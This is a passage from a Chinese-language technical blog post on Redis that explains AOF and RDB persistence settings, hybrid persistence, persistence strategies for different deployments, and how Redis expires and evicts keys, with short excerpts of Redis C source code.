<h4 id="AOF-常用的配置项"><a href="#AOF-常用的配置项" class="headerlink" title="AOF 常用的配置项"></a>AOF 常用的配置项</h4><p>&emsp;&emsp;下面是 <code>redis.conf</code> 文件中和 AOF 文件相关的常用配置项（以及默认值）：</p>
<ul>
<li><code>appendonly no</code>：是否开启 AOF 持久化功能</li>
<li><code>appendfilename &quot;appendonly.aof&quot;</code>：AOF 文件的名称</li>
<li><code>dir ./</code>：RDB 文件和 AOF 文件所在目录</li>
<li><code>appendfsync everysec</code>：fsync 持久化策略</li>
<li><code>no-appendfsync-on-rewrite no</code>：重写 AOF 文件期间是否禁止 fsync 操作。如果开启该选项，可以减轻文件重写时 CPU 和磁盘的负载（尤其是磁盘），但是可能会丢失 AOF 重写期间的数据，需要在负载和安全性之间进行平衡</li>
<li><code>auto-aof-rewrite-percentage 100</code>：AOF 文件重写触发条件之一</li>
<li><code>auto-aof-rewrite-min-size 64mb</code>：AOF 文件重写触发条件之一</li>
<li><code>aof-load-truncated yes</code>：如果 AOF 文件结尾损坏，Redis 服务器在启动时是否仍载入 AOF 文件</li>
</ul>
<h3 id="数据恢复机制"><a href="#数据恢复机制" class="headerlink" title="数据恢复机制"></a>数据恢复机制</h3><p>&emsp;&emsp;前面提到当 AOF 持久化功能开启时，Redis 服务器启动时优先执行 AOF 文件的命令恢复数据，只有当 AOF 功能关闭时，才会优先载入 RDB 快照的文件数据。</p>
<ul>
<li><p>当 AOF 功能关闭，且 RDB 持久化开启时，Redis 服务器启动日志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6266:M 15 Sep 2019 08:30:41.832 # Server initialized</span><br><span class="line">6266:M 15 Sep 2019 08:30:41.833 * DB loaded from disk: 0.001 seconds</span><br><span class="line">6266:M 15 Sep 2019 08:30:41.833 * Ready to accept connections</span><br></pre></td></tr></table></figure>
</li>
<li><p>当 AOF 功能开启，且 AOF 文件存在时，Redis 服务器启动日志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">9447:M 15 Sep 2019 23:01:46.601 # Server initialized</span><br><span class="line">9447:M 15 Sep 2019 23:01:46.602 * DB loaded from append only file: 0.001 seconds</span><br><span class="line">9447:M 15 Sep 2019 23:01:46.602 * Ready to accept connections</span><br></pre></td></tr></table></figure>
</li>
<li><p>当 AOF 功能开启，且 AOF 文件不存在时，即使 RDB 文件存在也不会加载，Redis 服务器启动日志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9326:M 15 Sep 2019 22:49:24.203 # Server initialized</span><br><span class="line">9326:M 15 Sep 2019 22:49:24.203 * Ready to accept connections</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="RDB-和-AOF-对比"><a href="#RDB-和-AOF-对比" class="headerlink" title="RDB 和 AOF 对比"></a>RDB 和 AOF 对比</h3><table>
<thead>
<tr>
<th>持久化机制</th>
<th>RDB</th>
<th>AOF</th>
</tr>
</thead>
<tbody><tr>
<td>启动优先级</td>
<td>低</td>
<td>高</td>
</tr>
<tr>
<td>磁盘文件体积</td>
<td>小</td>
<td>大</td>
</tr>
<tr>
<td>数据还原速度</td>
<td>快</td>
<td>慢</td>
</tr>
<tr>
<td>数据安全性</td>
<td>容易丢失数据</td>
<td>根据策略决定</td>
</tr>
<tr>
<td>操作轻重级别</td>
<td>重</td>
<td>轻</td>
</tr>
</tbody></table>
<h4 id="RDB-的优缺点"><a href="#RDB-的优缺点" class="headerlink" title="RDB 的优缺点"></a>RDB 的优缺点</h4><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ul>
<li>RDB 是一个压缩过的非常紧凑的文件，保存着某个时间点的数据集，适合做数据的备份、灾难恢复</li>
<li>可以最大化 Redis 的性能，在保存 RDB 文件，服务器进程只需 fork 一个子进程来完成 RDB 文件的创建，父进程不需要做 IO 操作</li>
<li>与 AOF 持久化方式相比，恢复大数据集的时候会更快</li>
</ul>
<h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul>
<li>RDB 的数据安全性是不如 AOF 的，保存整个数据集是个重量级的过程，根据配置可能要几分钟才进行一次持久化，如果服务器宕机，那么就可能丢失几分钟的数据</li>
<li>Redis 数据集较大时，fork 的子进程要完成快照会比较耗费 CPU 和时间</li>
</ul>
<h4 id="AOF-的优缺点"><a href="#AOF-的优缺点" class="headerlink" title="AOF 的优缺点"></a>AOF 的优缺点</h4><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><ul>
<li>数据更完整，安全性更高，秒级数据丢失（取决于 fsync 策略，如果是 everysec，最多丢失 1 秒的数据）</li>
<li>AOF 文件是一个只进行追加的命令文件，且写入操作是以 Redis 协议的格式保存的，内容是可读的，适合误删紧急恢复</li>
</ul>
<h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><ul>
<li>对于相同的数据集，AOF 文件的体积要远远大于 RDB 文件，数据恢复也会比较慢</li>
<li>根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB。不过在一般情况下， 每秒 fsync 的性能依然非常高</li>
</ul>
<h3 id="RDB-AOF-混合持久化"><a href="#RDB-AOF-混合持久化" class="headerlink" title="RDB-AOF 混合持久化"></a>RDB-AOF 混合持久化</h3><p>&emsp;&emsp;在重启 Redis 服务器时，一般很少使用 RDB 快照文件来恢复内存状态，因为会丢失大量数据。更多的是使用 AOF 文件进行命令重放，但是执行 AOF 命令性能相对 RDB 来说要慢很多。这样在 Redis 数据很大的情况下，启动需要消耗大量的时间。  </p>
<p>&emsp;&emsp;鉴于 RDB 快照可能会造成数据丢失，AOF 指令恢复数据慢，Redis 4.0 版本提供了一套基于 AOF-RDB 的混合持久化机制，保留了两种持久化机制的优点。这样重写的 AOF 文件由两部份组成，一部分是 <strong>RDB 格式的头部数据</strong>，另一部分是 <strong>AOF 格式的尾部指令</strong>。  </p>
<p>&emsp;&emsp;Redis 4.0 版本的混合持久化功能默认是关闭的，通过配置 <code>aof-use-rdb-preamble</code> 为 yes 开启此功能：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启AOF-RDB混合持久化机制</span></span><br><span class="line">aof-use-rdb-preamble yes</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;查看 Redis 服务器是否开启混合持久化功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG GET aof-use-rdb-preamble</span><br><span class="line">1) &quot;aof-use-rdb-preamble&quot;</span><br><span class="line">2) &quot;yes&quot;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如图所示，将 RDB 数据文件的内容和增量的 AOF 命令文件存在一起。这里的 AOF 命令不再是全量的命令，而是自持久化开始到持久化结束的这段时间服务器进程执行的增量 AOF 命令，通常这部分 AOF 命令很小。</p>
<figure class="image-box">
                <img src="16dbe19d7cb4ba4c.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在 Redis 服务器重启的时候，可以预先加载 AOF 文件头部全量的 RDB 数据，然后再重放 AOF 文件尾部增量的 AOF 命令，从而大大减少了重启过程中数据还原的时间。</p>
<h3 id="持久化策略选择"><a href="#持久化策略选择" class="headerlink" title="持久化策略选择"></a>持久化策略选择</h3><h4 id="RDB-和-AOF-性能开销"><a href="#RDB-和-AOF-性能开销" class="headerlink" title="RDB 和 AOF 性能开销"></a>RDB 和 AOF 性能开销</h4><p>&emsp;&emsp;在介绍持久化策略之前，首先要明白无论是 RDB 还是 AOF 方式，开启持久化都是会造成性能开销的。</p>
<ul>
<li>RDB 持久化：<ul>
<li>BGSAVE 命令在进行 fork 操作时，Redis 服务器主进程会发生阻塞</li>
<li>Redis 子进程向磁盘写入数据也会带来 IO 压力</li>
</ul>
</li>
<li>AOF 持久化：<ul>
<li>向磁盘写入数据的频率大大提高，IO 压力更大，甚至可能造成 AOF 追加阻塞问题</li>
<li>AOF 文件重写与 RDB 的 BGSAVE 过程类似，存在父进程 fork 时的阻塞和子进程的 IO 压力问题</li>
</ul>
</li>
</ul>
<p>&emsp;&emsp;相对来说，由于 AOF 向磁盘中写入数据的频率更高，因此对 Redis 服务器主进程性能的影响会更大。</p>
<h4 id="持久化策略"><a href="#持久化策略" class="headerlink" title="持久化策略"></a>持久化策略</h4><p>&emsp;&emsp;在实际生产环境中，根据数据量、应用对数据的安全要求、预算限制等不同情况，会有各种各样的持久化策略。</p>
<ol>
<li>完全不使用任何持久化功能</li>
<li>使用 RDB 或 AOF 其中一种</li>
<li>同时开启 RDB 和 AOF 持久化</li>
</ol>
<p>&emsp;&emsp;对于分布式环境，持久化的选择必须与 Redis 的主从策略一起考虑，因为主从复制与持久化同样具有数据备份的功能，而且主节点（Master Node）和从节点（Slave Node）可以独立选择持久化方案。  </p>
<p>&emsp;&emsp;下面分场景来讨论持久化策略的选择，下面的讨论也只是作为参考，实际方案可能更复杂更具多样性。</p>
<h5 id="数据库缓存"><a href="#数据库缓存" class="headerlink" title="数据库缓存"></a>数据库缓存</h5><p>&emsp;&emsp;如果 Redis 中的数据完全丢弃也没有关系（如 Redis 完全用作 DB 层数据的缓存），那么无论是单机，还是主从架构，都可以不进行任何持久化。</p>
<h5 id="单机环境"><a href="#单机环境" class="headerlink" title="单机环境"></a>单机环境</h5><p>&emsp;&emsp;在单机环境下，如果可以接受十几分钟或更多的数据丢失，RDB 方案对 Redis 的性能更加有利；如果只能接受秒级别的数据丢失，选择 AOF 方案更合适。</p>
<h5 id="主从部署"><a href="#主从部署" class="headerlink" title="主从部署"></a>主从部署</h5><p>&emsp;&emsp;在多数情况下，Redis 都会配置主从部署机制。从节点（slave）既可以实现数据的热备，也可以进行读写分担 Redis 读请求，以及在主节点（master）宕机后的顶替作用。  </p>
<p>在这种情况下，一种可行的做法如下：</p>
<ul>
<li><strong>master</strong>：完全关闭持久化（包括 RDB 和 AOF 功能），这样可以让主节点的性能达到最好</li>
<li><strong>slave</strong>：关闭 RDB 功能，开启 AOF 功能（如果对数据安全要求不高，开启 RDB 关闭 AOF 也可以）。定时对持久化文件进行备份（如备份到其他文件夹，并标记好备份的时间）。然后关闭 AOF 的自动重写功能，然后添加定时任务，在每天 Redis 服务器闲时（如凌晨 12 点）调用 <code>bgrewriteaof</code> 手动重写。</li>
</ul>
<p>&emsp;&emsp;为什么开启了主从复制，可以实现数据的热备份，还需要设置持久化呢？因为在一些特殊情况下，主从复制仍然不足以保证数据的安全，例如：</p>
<ul>
<li><strong>master 和 slave 同时停止</strong>：如果 master 节点和 slave 节点位于同一个机房，则一次停电事故就可能导致 master 和 slave 机器同时关机，Redis 服务器进程停止。如果没有持久化，则面临的是数据的完全丢失。</li>
<li><strong>master 重启</strong>：如果 master 节点因为故障宕机，并且系统中有自动拉起机制（即检测到服务停止后重启该服务）将 master 节点自动重启。<ul>
<li>由于没有持久化文件，那么 master 重启后数据是空的，slave 同步数据也变成了空的</li>
<li>如果 master 和 slave 节点都没有开启持久化，同样会引发数据的完全丢失</li>
</ul>
</li>
</ul>
<h5 id="异地备灾"><a href="#异地备灾" class="headerlink" title="异地备灾"></a>异地备灾</h5><p>&emsp;&emsp;前面的几种持久化策略，针对的都是一般的系统故障，如进程异常退出、宕机、断电等，这些故障不会损坏硬盘。但是对于一些可能导致硬盘损坏的灾难情况，如火灾地震，就需要进行异地灾备。</p>
<ul>
<li>单机环境：可以定时将 RDB 文件或重写后的 AOF 文件，通过 <code>scp</code> 命令拷贝到远程机器，如阿里云、AWS 等</li>
<li>主从部署，可以定时在 master 节点上执行 BGSAVE 操作，然后将 RDB 文件拷贝到远程机器，或者在 slave 节点上执行 <code>bgrewriteaof</code> 命令重写 AOF 文件后，将 AOF 文件拷贝到远程机器上。</li>
</ul>
<p>&emsp;&emsp;由于 RDB 文件文件小、恢复速度快，灾难恢复一般采用 RDB 方式；异地备份的频率根据数据安全性的需要及其它条件来确定，但最好不要低于一天一次。</p>
<h2 id="小结-8"><a href="#小结-8" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp;本文主要开篇介绍了 Redis 服务器的数据库结构，进一步介绍了 Redis 提供的几种持久化机制，包括基于数据快照的 RDB 全量持久化、基于命令追加的 AOF 增量持久化以及 Redis 4.0 支持的混合持久化。对于 RDB 的持久化方式，给出了 RDB 快照的创建和还原过程，RDB 的文件结构以及相关配置项。对于 AOF 的持久化方式，给出了 AOF 日志的创建和还原过程，AOF 的执行流程，AOF 文件内部的格式以及相关配置项。在文章结尾分析了 RDB 和 AOF 方式各自的优缺点，性能开销，以及在单机环境、主从部署、异地备灾场景下的持久化策略。</p>
<hr>
<h1 id="理解-Redis-的内存回收机制"><a href="#理解-Redis-的内存回收机制" class="headerlink" title="理解 Redis 的内存回收机制"></a>理解 Redis 的内存回收机制</h1><h2 id="为什么需要内存回收？"><a href="#为什么需要内存回收？" class="headerlink" title="为什么需要内存回收？"></a>为什么需要内存回收？</h2><ol>
<li>在 Redis 中，<code>set</code>指令可以指定 <em>key</em> 的过期时间，当过期时间到达以后，<em>key</em> 就失效了；</li>
<li>Redis 是基于内存操作的，所有的数据都是保存在内存中，一台机器的内存是有限且很宝贵的。</li>
</ol>
<p>&emsp;&emsp;基于以上两点，为了保证 Redis 能继续提供可靠的服务，Redis 需要一种机制清理掉不常用的、无效的、多余的数据，失效后的数据需要及时清理，这就需要内存回收了。</p>
<h2 id="Redis-的内存回收机制"><a href="#Redis-的内存回收机制" class="headerlink" title="Redis 的内存回收机制"></a>Redis 的内存回收机制</h2><p>&emsp;&emsp;Redis 的内存回收主要分为<strong>过期删除策略</strong>和<strong>内存淘汰策略</strong>两部分。</p>
<h3 id="过期删除策略"><a href="#过期删除策略" class="headerlink" title="过期删除策略"></a>过期删除策略</h3><p>&emsp;&emsp;删除达到过期时间的 <em>key</em>。</p>
<h4 id="1、定时删除"><a href="#1、定时删除" class="headerlink" title="1、定时删除"></a>1、定时删除</h4><p>&emsp;&emsp;对于每一个设置了过期时间的 <em>key</em> 都会创建一个定时器，一旦到达过期时间就立即删除。该策略可以立即清除过期的数据，对内存较友好，但是缺点是占用了大量的 CPU 资源去处理过期的数据，会影响 Redis 的吞吐量和响应时间。</p>
<h4 id="2、惰性删除"><a href="#2、惰性删除" class="headerlink" title="2、惰性删除"></a>2、惰性删除</h4><p>&emsp;&emsp;当访问一个 <em>key</em> 时，才判断该 <em>key</em> 是否过期，过期则删除。该策略能最大限度地节省 CPU 资源，但是对内存却十分不友好。有一种极端的情况是可能出现大量的过期 <em>key</em> 没有被再次访问，因此不会被清除，导致占用了大量的内存。</p>
<blockquote>
<p>&emsp;&emsp;在计算机科学中，懒惰删除（英文：lazy deletion）指的是从一个散列表（也称哈希表）中删除元素的一种方法。在这个方法中，删除仅仅是指标记一个元素被删除，而不是整个清除它。被删除的位点在插入时被当作空元素，在搜索之时被当作已占据。</p>
</blockquote>
<h4 id="3、定期删除"><a href="#3、定期删除" class="headerlink" title="3、定期删除"></a>3、定期删除</h4><p>&emsp;&emsp;每隔一段时间，扫描 Redis 中过期 <em>key</em> 字典，并清除部分过期的 <em>key</em>。该策略是前两者的一个折中方案，还可以通过调整定时扫描的时间间隔和每次扫描的限定耗时，在不同情况下使得 CPU 和内存资源达到最优的平衡效果。  </p>
<p>&emsp;&emsp;<strong>在 Redis 中，同时使用了定期删除和惰性删除。</strong></p>
<h3 id="过期删除策略原理"><a href="#过期删除策略原理" class="headerlink" title="过期删除策略原理"></a>过期删除策略原理</h3><p>&emsp;&emsp;为了大家听起来不会觉得疑惑，在正式介绍过期删除策略原理之前，先给大家介绍一点可能会用到的相关 Redis 基础知识。</p>
<h4 id="redisDb-结构体定义"><a href="#redisDb-结构体定义" class="headerlink" title="redisDb 结构体定义"></a>redisDb 结构体定义</h4><p>&emsp;&emsp;我们知道，Redis 是一个键值对数据库，对于每一个 redis 数据库，Redis 使用一个<code>redisDb</code>的结构体来保存，它的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisDb</span> &#123;</span></span><br><span class="line">        dict *dict;                 <span class="comment">/* 数据库的键空间，保存数据库中的所有键值对 */</span></span><br><span class="line">        dict *expires;              <span class="comment">/* 保存所有过期的键 */</span></span><br><span class="line">        dict *blocking_keys;        <span class="comment">/* Keys with clients waiting for data (BLPOP)*/</span></span><br><span class="line">        dict *ready_keys;           <span class="comment">/* Blocked keys that received a PUSH */</span></span><br><span class="line">        dict *watched_keys;         <span class="comment">/* WATCHED keys for MULTI/EXEC CAS */</span></span><br><span class="line">        <span class="keyword">int</span> id;                     <span class="comment">/* 数据库ID字段，代表不同的数据库 */</span></span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> avg_ttl;          <span class="comment">/* Average TTL, just for stats */</span></span><br><span class="line">&#125; redisDb;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;从结构定义中我们可以发现，对于每一个 Redis 数据库，都会使用一个字典的数据结构来保存每一个键值对，<code>dict</code>的结构图如下：</p>
<figure class="image-box">
                <img src="16b885fc25256825.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;以上就是过期策略实现时用到比较核心的数据结构。程序 = 数据结构 + 算法，介绍完数据结构以后，接下来继续看看处理的算法是怎样的。</p>
<h4 id="expires-属性"><a href="#expires-属性" class="headerlink" title="expires 属性"></a>expires 属性</h4><p>&emsp;&emsp;<code>redisDb</code>定义的第二个属性是<code>expires</code>，它的类型也是字典，Redis 会把所有过期的键值对加入到<code>expires</code>，之后再通过定期删除来清理<code>expires</code>里面的值。加入<code>expires</code>的场景有：</p>
<ol>
<li><code>set</code>指定过期时间<code>expire</code><br>&emsp;&emsp;如果设置 <em>key</em> 的时候指定了过期时间，Redis 会将这个 <em>key</em> 直接加入到<code>expires</code>字典中，并将超时时间设置到该字典元素。</li>
<li>调用<code>expire</code>命令<br>&emsp;&emsp;显式指定某个 <em>key</em> 的过期时间</li>
<li>恢复或修改数据<br>&emsp;&emsp;从 Redis 持久化文件中恢复文件或者修改 <em>key</em> ，如果数据中的 <em>key</em> 已经设置了过期时间，就将这个 <em>key</em> 加入到<code>expires</code>字典中</li>
</ol>
<p>&emsp;&emsp;以上这些操作都会将过期的 <em>key</em> 保存到<code>expires</code>。Redis 会定期从<code>expires</code>字典中清理过期的 <em>key</em>。</p>
<h4 id="Redis-清理过期-key-的时机"><a href="#Redis-清理过期-key-的时机" class="headerlink" title="Redis 清理过期 key 的时机"></a>Redis 清理过期 key 的时机</h4><p>&emsp;&emsp;Redis 在启动的时候，会注册两种事件，一种是<strong>时间事件</strong>，另一种是<strong>文件事件</strong>。（可参考<a href="https://www.hoohack.me/2018/05/26/read-redis-src-how-server-start" target="_blank" rel="noopener">启动 Redis 的时候，Redis 做了什么</a>）时间事件主要是 Redis 处理后台操作的一类事件，比如客户端超时、删除过期 <em>key</em>；文件事件是处理请求。</p>
<ol>
<li><p>在时间事件中，Redis 注册的回调函数是<code>serverCron</code>，在定时任务回调函数中，通过调用<code>databasesCron</code>清理部分过期 <em>key</em>。（这是定期删除的实现）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">serverCron</span><span class="params">(struct aeEventLoop *eventLoop, <span class="keyword">long</span> <span class="keyword">long</span> id, <span class="keyword">void</span> *clientData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    …</span><br><span class="line">    <span class="comment">/* Handle background operations on Redis databases. */</span></span><br><span class="line">    databasesCron();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>每次访问 <em>key</em> 的时候，都会调用<code>expireIfNeeded</code>函数判断 <em>key</em> 是否过期，如果是，清理 <em>key</em>。（这是惰性删除的实现）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">robj *<span class="title">lookupKeyRead</span><span class="params">(redisDb *db, robj *key)</span> </span>&#123;</span><br><span class="line">    robj *val;</span><br><span class="line">    expireIfNeeded(db,key);</span><br><span class="line">    val = lookupKey(db,key);</span><br><span class="line">     ...</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>每次事件循环执行时，主动清理部分过期 <em>key</em>。（这也是惰性删除的实现）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">aeMain</span><span class="params">(aeEventLoop *eventLoop)</span> </span>&#123;</span><br><span class="line">    eventLoop-&gt;stop = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!eventLoop-&gt;stop) &#123;</span><br><span class="line">        <span class="keyword">if</span> (eventLoop-&gt;beforesleep != <span class="literal">NULL</span>)</span><br><span class="line">            eventLoop-&gt;beforesleep(eventLoop);</span><br><span class="line">        aeProcessEvents(eventLoop, AE_ALL_EVENTS);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">beforeSleep</span><span class="params">(struct aeEventLoop *eventLoop)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* Run a fast expire cycle (the called function will return</span></span><br><span class="line"><span class="comment">     - ASAP if a fast cycle is not needed). */</span></span><br><span class="line">    <span class="keyword">if</span> (server.active_expire_enabled &amp;&amp; server.masterhost == <span class="literal">NULL</span>)</span><br><span class="line">        activeExpireCycle(ACTIVE_EXPIRE_CYCLE_FAST);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="过期策略的实现"><a href="#过期策略的实现" class="headerlink" title="过期策略的实现"></a>过期策略的实现</h4><p>&emsp;&emsp;我们知道，Redis 是以单线程运行的，在清理 <em>key</em> 是不能占用过多的时间和 CPU，需要在尽量不影响正常的服务情况下，进行过期 <em>key</em> 的清理。过期清理的算法如下：</p>
<blockquote>
<ol>
<li><code>server.hz</code>配置了<code>serverCron</code>任务的执行周期，默认是<code>10</code>，即 CPU 空闲时每秒执行十次。</li>
<li>每次清理过期 <em>key</em> 的时间不能超过 CPU 时间的<code>25 %</code>：<code>timelimit = 1000000*ACTIVE_EXPIRE_CYCLE_SLOW_TIME_PERC/server.hz/100</code>;<br>比如，如果<code>hz = 1</code>，一次清理的最大时间为<code>250 ms</code>；<code>hz = 10</code>，一次清理的最大时间为<code>25 ms</code>。</li>
<li>如果是快速清理模式（在<code>beforeSleep</code>函数调用），则一次清理的最大时间是 <code>1 ms</code>。</li>
<li>依次遍历所有的 DB。</li>
<li>从 db 的过期列表中随机取<code>20</code>个 <em>key</em>，判断是否过期，如果过期，则清理。</li>
<li>如果有<code>5个以上</code>的 <em>key</em> 过期，则重复步骤 5，否则继续处理下一个 db</li>
<li>在清理过程中，如果达到 CPU 的<code>25 %</code>时间，退出清理过程。</li>
</ol>
</blockquote>
<p>&emsp;&emsp;从实现的算法中可以看出，这只是基于概率的简单算法，且是随机的抽取，因此是无法删除所有的过期 <em>key</em> ，通过调高<code>hz</code>参数可以提升清理的频率，过期 <em>key</em> 可以更及时的被删除，但<code>hz</code>太高会增加 CPU 时间的消耗。</p>
<h4 id="删除-key"><a href="#删除-key" class="headerlink" title="删除 key"></a>删除 key</h4><p>&emsp;&emsp;Redis 4.0 以前，删除指令是<code>del</code>，<code>del</code>会直接释放对象的内存，大部分情况下，这个指令非常快，没有任何延迟的感觉。但是，如果删除的 <em>key</em> 是一个非常大的对象，比如一个包含了千万元素的 hash，那么删除操作就会导致单线程卡顿，Redis 的响应就慢了。为了解决这个问题，在 Redis 4.0 版本引入了<code>unlink</code>指令，能对删除操作进行“懒”处理，将删除操作丢给后台线程，由后台线程来异步回收内存。<br>&emsp;&emsp;实际上，在判断 <em>key</em> 需要过期之后，真正删除 <em>key</em> 的过程是先广播<code>expire</code>事件到<strong>从库</strong>和<strong>AOF文件</strong>中，然后在根据 Redis 的配置决定立即删除还是异步删除。<br>&emsp;&emsp;如果是立即删除，Redis 会立即释放 <em>key</em> 和 <em>value</em> 占用的内存空间，否则，Redis 会在另一个<code>bio</code>线程中释放需要延迟删除的空间。</p>
<h4 id="小结-9"><a href="#小结-9" class="headerlink" title="小结"></a>小结</h4><p>&emsp;&emsp;总的来说，Redis 的过期删除策略是在启动时注册了<code>serverCron</code>函数，每一个时间时钟周期，都会抽取<code>expires</code>字典中的部分 <em>key</em> 进行清理，从而实现定期删除。另外，Redis 会在访问 <em>key</em> 时判断 <em>key</em> 是否过期，如果过期了，就删除，以及每一次Redis 访问事件到来时，<code>beforeSleep</code>都会调用<code>activeExpireCycle</code>函数，在<code>1 ms</code>时间内主动清理部分 <em>key</em> ，这是惰性删除的实现。<br>&emsp;&emsp;Redis 结合了定期删除和惰性删除，基本上能很好的处理过期数据的清理，但是实际上还是有点问题的，如果过期 <em>key</em> 较多，定期删除漏掉了一部分，而且也没有及时去查，即没有走惰性删除，那么就会有大量的过期 <em>key</em> 堆积在内存中，导致 Redis 内存耗尽，当内存耗尽之后，有新的 <em>key</em> 到来会发生什么事呢？是直接抛弃还是其他措施呢？有什么办法可以接受更多的 <em>key</em>？</p>
<h3 id="内存淘汰策略"><a href="#内存淘汰策略" class="headerlink" title="内存淘汰策略"></a>内存淘汰策略</h3><p>&emsp;&emsp;Redis 的内存淘汰策略，是指内存达到<code>maxmemory</code>极限时，使用某种算法来决定清理掉哪些数据，以保证新数据的存入。</p>
<h4 id="Redis-的内存淘汰机制"><a href="#Redis-的内存淘汰机制" class="headerlink" title="Redis 的内存淘汰机制"></a>Redis 的内存淘汰机制</h4><ul>
<li><strong>noeviction</strong>: 当内存不足以容纳新写入数据时，新写入操作会报错。</li>
<li><strong>allkeys-lru</strong>：当内存不足以容纳新写入数据时，在键空间（<code>server.db[i].dict</code>）中，移除最近最少使用的 <em>key</em>（这个是最常用的）。</li>
<li><strong>allkeys-random</strong>：当内存不足以容纳新写入数据时，在键空间（<code>server.db[i].dict</code>）中，随机移除某个 <em>key</em>。</li>
<li><strong>volatile-lru</strong>：当内存不足以容纳新写入数据时，在设置了过期时间的键空间（<code>server.db[i].expires</code>）中，移除最近最少使用的 <em>key</em>。</li>
<li><strong>volatile-random</strong>：当内存不足以容纳新写入数据时，在设置了过期时间的键空间（<code>server.db[i].expires</code>）中，随机移除某个 <em>key</em>。</li>
<li><strong>volatile-ttl</strong>：当内存不足以容纳新写入数据时，在设置了过期时间的键空间（<code>server.db[i].expires</code>）中，有更早过期时间的 <em>key</em> 优先移除。</li>
</ul>
<blockquote>
<p>在配置文件中，通过<code>maxmemory-policy</code>可以配置要使用哪一个淘汰机制。</p>
</blockquote>
<h4 id="什么时候会进行淘汰？"><a href="#什么时候会进行淘汰？" class="headerlink" title="什么时候会进行淘汰？"></a>什么时候会进行淘汰？</h4><p>&emsp;&emsp;Redis 会在每一次处理命令的时候（<code>processCommand</code>函数调用<code>freeMemoryIfNeeded</code>）判断当前 Redis 是否达到了内存的最大限制，如果达到限制，则使用对应的算法去处理需要删除的 <em>key</em>。伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">processCommand</span><span class="params">(client *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (server.maxmemory) &#123;</span><br><span class="line">        <span class="keyword">int</span> retval = freeMemoryIfNeeded();  </span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="LRU-实现原理"><a href="#LRU-实现原理" class="headerlink" title="LRU 实现原理"></a>LRU 实现原理</h4><p>&emsp;&emsp;在淘汰 <em>key</em> 时，Redis 默认最常用的是 <strong>LRU 算法</strong>（Latest Recently Used）。Redis 通过在每一个<code>redisObject</code>保存<code>lru</code>属性来保存 <em>key</em> 最近的访问时间，在实现 LRU 算法时直接读取 <em>key</em> 的<code>lru</code>属性。  </p>
